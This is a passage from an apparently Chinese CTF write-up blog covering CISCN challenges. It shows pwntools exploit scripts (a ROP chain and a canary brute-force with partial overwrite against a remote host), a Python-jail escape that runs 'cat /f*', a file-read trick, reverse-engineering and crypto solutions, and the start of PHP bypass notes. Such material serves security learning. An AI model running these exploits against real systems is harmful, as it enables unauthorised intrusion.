class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p))</span><br><span class="line"></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><ul><li>利用fork无限创建子进程去爆破出canary，最后利用穷举去partial write从而绕过pie<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">elf = ELF(&#x27;./funcanary&#x27;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">if local:</span><br><span class="line">    p = process(&#x27;./funcanary&#x27;)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">    p = remote(&#x27;47.94.206.10&#x27;,29297)</span><br><span class="line">   # libc = ELF(&#x27;./&#x27;)</span><br><span class="line">p.recvuntil(&#x27;welcome\n&#x27;)</span><br><span class="line">canary = b&#x27;\x00&#x27;</span><br><span class="line">for k in range(7):</span><br><span class="line">    for i in range(256):</span><br><span class="line">        print (&quot;the &quot; + str(k) + &quot;: &quot; + str(i))</span><br><span class="line">        p.send(b&#x27;a&#x27;*0x68 + canary + p8(i))</span><br><span class="line">        a = p.recvuntil(&quot;welcome\n&quot;)</span><br><span class="line">        print (a)</span><br><span class="line">        if &quot;fun&quot; in str(a):</span><br><span class="line">                canary += p8(i)</span><br><span class="line">                print(&#x27;canary:&#x27;)</span><br><span class="line">                print(canary)</span><br><span class="line">                break</span><br><span class="line">                </span><br><span class="line">print(canary)</span><br><span class="line">target=0x1228</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x02&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x12&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x22&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x32&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x42&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x52&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x62&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x72&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x82&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\x92&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xa2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xb2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xc2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xd2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xe2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">payload=b&#x27;a&#x27;*0x68+canary+p64(0)+b&#x27;\x28&#x27;+b&#x27;\xf2&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h1><h2 id="27-签到卡"><a href="#27-签到卡" class="headerlink" title="27_签到卡"></a>27_签到卡</h2><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266137154-e562de8e-145a-4c53-9ba4-1d691c3b6c0a.png" alt="image.png"><br>把/etc/passwd改为/flag即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34422172/1685266206911-f3dfffcb-b96c-4bfc-9c6c-8bbaa548aa14.png" alt="image.png"><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2>nc到远端，发现输入什么命令都是nop，但是字符串可以回显，但是长度还有所限制，用“_”拼接（“_”可以表示上一次执行的结果），再用“+”拼接成一条字符串表达式，用eval()函数执行</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;__imp&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__imp&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;ort&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__import&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;__(&#x27;</span></span><br><span class="line"><span class="comment">#&#x27;__import__(&#x27;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;os&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&quot;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;).&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).&quot;</span></span><br><span class="line">_+<span class="string">&quot;sys&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).sys&quot;</span></span><br><span class="line">_+<span class="string">&quot;tem&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system&quot;</span></span><br><span class="line">_+<span class="string">&quot;(&#x27;c&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;c&quot;</span></span><br><span class="line">_+<span class="string">&quot;at &quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat &quot;</span></span><br><span class="line">_+<span class="string">&quot;/f*&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&quot;</span></span><br><span class="line">_+<span class="string">&quot;&#x27;)&quot;</span></span><br><span class="line"><span class="comment">#&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(_)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="网络安全人才实战能力评价现状调查问卷"><a href="#网络安全人才实战能力评价现状调查问卷" class="headerlink" title="网络安全人才实战能力评价现状调查问卷"></a>网络安全人才实战能力评价现状调查问卷</h2><p>交完问卷出flag</p><h1 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p>先打开看看，xml不是很懂，google了一下<a href="https://snap.berkeley.edu/">snap</a>这个网站用法，打开这个网站导入xml。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574488-88897496-5683-4038-a914-e540254aaf7f.png" alt="image.png"><br>跟着步骤走，点击绿旗子按空格开始<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574961-d96409ba-4664-4b49-903b-49da9aa9f548.png" alt="image.png"><br>运行到lock这里提示输入flag，看到lock的控件里面有多个插入数字操作，应该是密文<br>提取出来得到<code>[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575470-1a7f2707-9427-480a-bae4-b585f92cb8fb.png" alt="image.png"><br>加密逻辑在右边，是各项异或<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574439-63fef859-1b6e-4212-a653-8a2d0970e8d0.png" alt="image.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># babyRE</span></span><br><span class="line">flag=[<span class="number">102</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">28</span>,<span class="number">74</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">85</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">75</span>,<span class="number">20</span>,<span class="number">92</span>,<span class="number">92</span>,<span class="number">8</span>,<span class="number">28</span>,<span class="number">25</span>,<span class="number">81</span>,<span class="number">83</span>,<span class="number">7</span>,<span class="number">28</span>,<span class="number">76</span>,<span class="number">88</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">29</span>,<span class="number">73</span>,<span class="number">0</span>,<span class="number">86</span>,<span class="number">4</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">4</span>,<span class="number">85</span>,<span class="number">87</span>,<span class="number">30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i]=flag[i] ^ flag[i-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;12307bbf-9e91-4e61-a900-dd26a6d0ea4c&#125;</code></p><h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><p>登录网站试了一下注入好像不行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574338-83b939d1-02c4-479d-a841-af1c58f9c8af.png" alt="image.png"><br>提示说是找附件漏洞，那就找呗，一堆apk里面就cpweb.apk最可疑<br>用jadx-gui打开，查看一下。先搜索MainActivity，但是好像没啥有用的东西<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575624-7f32685f-51c9-4514-aba5-500a2d98f94b.png" alt="image.png"><br>但是跟MainActivity同目录下有好多个Server，猜测漏洞可能就出在这里，重点看了一下WebServer<br>这里有个路径穿越拼接，应该可以利用这个漏洞。请队里的web手抓包一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575781-1972b843-34d4-4d88-8fe1-df65ec45b035.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685269052746-fa0d3dab-1e41-4f3a-a1d2-92ea55c9b64d.png" alt="image.png"></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;15131359-6d71-45d3-b2ad-73e2f2335a7c&#125;</code></p><h1 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="27日-基于国密SM2算法的密钥密文分发"><a href="#27日-基于国密SM2算法的密钥密文分发" class="headerlink" title="27日_基于国密SM2算法的密钥密文分发"></a>27日_基于国密SM2算法的密钥密文分发</h2><blockquote><p><a href="https://const.net.cn/tool/sm2/genkey/">https://const.net.cn/tool/sm2/genkey/</a><br><a href="https://const.net.cn/tool/sm2/sm2-decrypt/">https://const.net.cn/tool/sm2/sm2-decrypt/</a><br><a href="https://const.net.cn/tool/sm4/sm4-ecb-decrypt/">https://const.net.cn/tool/sm4/sm4-ecb-decrypt/</a> </p></blockquote><p>使用网站内容按照步骤操作即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685167591369-86affce6-458e-4054-ac34-059c28c9035e.png" alt="image.png"></p><h2 id="27日-Sign-in-passwd"><a href="#27日-Sign-in-passwd" class="headerlink" title="27日_Sign_in_passwd"></a>27日_Sign_in_passwd</h2><p>按照排列映射加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib.parse</span><br><span class="line">after = r&#x27;GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5&#x27;</span><br><span class="line">asc = urllib.parse.unquote(after)</span><br><span class="line">former = r&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span><br><span class="line">change = str.maketrans(asc, former)</span><br><span class="line">flag = r&#x27;j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D&#x27;</span><br><span class="line">flaga = flag.translate(change)</span><br><span class="line">print(base64.b64decode(flaga).decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web89-web105php特性篇（一）</title>
      <link href="/2023/05/16/web89-web105php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/05/16/web89-web105php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遇事不决先试试数组捏，<code>?num[]=1</code></p><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span 